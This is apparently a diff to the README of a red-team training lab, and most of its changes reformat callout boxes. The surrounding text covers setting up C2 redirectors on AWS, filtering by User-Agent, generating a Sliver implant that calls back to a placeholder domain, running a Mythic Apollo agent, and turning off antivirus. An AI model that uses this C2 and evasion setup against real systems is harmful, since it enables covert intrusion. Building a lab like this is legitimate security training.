@@ -63,7 +63,8 @@ Security Posture:
 ✓ All hosts have descriptive hostnames and /etc/hosts entries for name resolution
 ```
 
-> **Tip:** After deployment, run `terraform output network_architecture` to see this diagram populated with your actual IP addresses.
+> [!TIP]
+> After deployment, run `terraform output network_architecture` to see this diagram populated with your actual IP addresses.
 
 ---
 
@@ -102,7 +103,8 @@ You will be prompted for:
 - **Default region name** - `us-east-1` (or your preferred region)
 - **Default output format** - `json`
 
-> **Note:** If you don't have an access key yet, create one in the AWS Console:
+> [!NOTE]
+> If you don't have an access key yet, create one in the AWS Console:
 > IAM → Users → [your user] → Security credentials → Create access key → CLI use case
 
 **Install Terraform:**
@@ -301,7 +303,8 @@ terraform output deployment_info
 terraform output network_architecture
 ```
 
-> **Note:** There are two outputs: `deployment_info` (all IPs, credentials, SSH commands) and `network_architecture` (diagram with actual IPs). All connection details you need for the rest of this guide are in `deployment_info`. Save it to a file:
+> [!NOTE]
+> There are two outputs: `deployment_info` (all IPs, credentials, SSH commands) and `network_architecture` (diagram with actual IPs). All connection details you need for the rest of this guide are in `deployment_info`. Save it to a file:
 >
 > **Windows (PowerShell):**
 >
@@ -359,7 +362,8 @@ dig +short yourdomain.tld
 
 **Expected:** The IP returned should match your redirector's Elastic IP.
 
-> **Note:** DNS propagation can vary. After DNS resolves correctly, run Certbot on the redirector (see Step 2.4):
+> [!NOTE]
+> DNS propagation can vary. After DNS resolves correctly, run Certbot on the redirector (see Step 2.4):
 >
 > ```bash
 > sudo certbot --apache -d yourdomain.tld
@@ -539,7 +543,8 @@ The file `/etc/apache2/redirect.rules` is downloaded at boot from the [redStack 
 - AWS/Azure/cloud IP blocks **commented out** (would block our own AWS-hosted C2 callbacks)
 - Included in both HTTP and HTTPS VirtualHosts via `Include /etc/apache2/redirect.rules`
 
-> **Note:** If the redStack repo is private, the download will silently fail and Apache will fail to start. See [redirect.rules Download Fails](#redirectrules-download-fails-private-repo) in Troubleshooting.
+> [!NOTE]
+> If the redStack repo is private, the download will silently fail and Apache will fail to start. See [redirect.rules Download Fails](#redirectrules-download-fails-private-repo) in Troubleshooting.
 
 ```bash
 # Check installed rules
@@ -580,7 +585,8 @@ The URI prefix is stripped before forwarding to the backend C2 server.
 
 ### Step 3.3: Test the Security Layers
 
-> **Important:** `curl` is blocked by redirect.rules (it's in the suspicious User-Agent list). All manual tests must use a browser-like User-Agent with `-A`.
+> [!IMPORTANT]
+> `curl` is blocked by redirect.rules (it's in the suspicious User-Agent list). All manual tests must use a browser-like User-Agent with `-A`.
 
 ```bash
 # Set a browser User-Agent for testing
@@ -715,19 +721,14 @@ The wizard has 5 steps:
 
 ### Step 4.3: Deploy Agent
 
-The Mythic UI runs in the **Windows workstation browser**, so `apollo.exe` is already on the Windows workstation after the download in the previous step. It will be in `C:\Users\Administrator\Downloads\`.
-
-**Execute the agent (PowerShell on Windows workstation):**
-
-```powershell
-& "$env:USERPROFILE\Downloads\apollo.exe"
-```
+The Mythic UI runs in the **Windows workstation browser**, so `apollo.exe` is already on the Windows workstation after the download in the previous step. Open `C:\Users\Administrator\Downloads\` in File Explorer and double-click `apollo.exe` to run it.
 
 **Extracting the agent to your host machine:**
 
 Apollo (and all agents built in this lab) are unobfuscated by default. To get the binary to your host, zip it on the Windows workstation and copy it into the `GuacShare on Guacamole RDP\Download\` folder (visible in Windows Explorer under **This PC**). The Guacamole HTML5 sidebar will then show the file as a clickable download, which triggers a browser download to your host machine.
 
-> **Warning:** Windows Defender and most AV solutions will flag unobfuscated C2 agents on download or execution. Before downloading `apollo.zip` to your host, disable real-time protection or add your download folder as an exclusion. Any victim VM or target environment you run the agent in will also need AV disabled or exempted, unless you are specifically practicing AV evasion techniques.
+> [!WARNING]
+> Windows Defender and most AV solutions will flag unobfuscated C2 agents on download or execution. Before downloading `apollo.zip` to your host, disable real-time protection or add your download folder as an exclusion. Any victim VM or target environment you run the agent in will also need AV disabled or exempted, unless you are specifically practicing AV evasion techniques.
 
 **Zip and place in GuacShare (Windows Explorer):**
 
@@ -822,7 +823,8 @@ sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windo
 
 Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
 
-> **Note:** The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.
+> [!NOTE]
+> The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.
 
 Transfer the implant to the Windows workstation and execute it. You should see a new session appear in the Sliver console.
 
@@ -1094,7 +1096,8 @@ sudo tail -50 /var/log/apache2/redirector-ssl-access.log
 sudo tail -50 /var/log/apache2/redirector-ssl-error.log
 ```
 
-> **Note:** AWS and Azure cloud IP blocks are **commented out by default** in redirect.rules because this lab runs in AWS. If you deploy outside cloud environments you can re-enable them:
+> [!NOTE]
+> AWS and Azure cloud IP blocks are **commented out by default** in redirect.rules because this lab runs in AWS. If you deploy outside cloud environments you can re-enable them:
 >
 > ```bash
 > sudo nano /etc/apache2/redirect.rules
@@ -1491,7 +1494,8 @@ enable_external_vpn = true
 external_vpn_cidrs  = ["10.10.0.0/16", "10.200.0.0/16"]
 ```
 
-> **Note:** If you already deployed without `enable_external_vpn = true`, you can enable it and run `terraform apply` again. Terraform will add the required routes, security group rules, and update the redirector instance.
+> [!NOTE]
+> If you already deployed without `enable_external_vpn = true`, you can enable it and run `terraform apply` again. Terraform will add the required routes, security group rules, and update the redirector instance.
 
 ### Step 8.2: Deploy and Obtain Your .ovpn File
 
